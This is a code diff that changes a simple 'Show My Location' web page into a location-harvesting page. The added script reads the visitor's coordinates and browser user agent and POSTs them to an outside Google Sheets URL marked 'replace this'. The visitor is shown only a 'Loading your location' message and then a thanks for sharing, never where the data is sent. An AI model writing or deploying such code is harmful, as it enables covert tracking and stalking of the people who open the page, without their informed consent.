@@ -1,27 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Show My Location</title>
+  <title>Checking Location</title>
 </head>
 <body>
-  <h2>Your Current Location:</h2>
-  <p id="location">Loading...</p>
+  <h2>Loading your location...</h2>
+  <p id="msg">Please wait...</p>
 
   <script>
+    const url = "https://docs.google.com/spreadsheets/d/1bVTjPEgnJvWxgZ5F0vbPXSGmMt1TAZ2e0I2SpxQTyEA/edit?gid=0#gid=0"; // replace this
+
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          document.getElementById("location").textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+          const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            userAgent: navigator.userAgent
+          };
+
+          fetch(url, {
+            method: "POST",
+            body: JSON.stringify(data),
+            headers: { "Content-Type": "application/json" }
+          })
+          .then(() => {
+            document.getElementById("msg").textContent = "Thank you! Your location was shared.";
+          });
         },
         (error) => {
-          document.getElementById("location").textContent = "Location access denied.";
+          document.getElementById("msg").textContent = "Location access was denied.";
         }
       );
     } else {
-      document.getElementById("location").textContent = "Geolocation is not supported by your browser.";
+      document.getElementById("msg").textContent = "Geolocation not supported.";
     }
   </script>
 </body>
 </html>
+
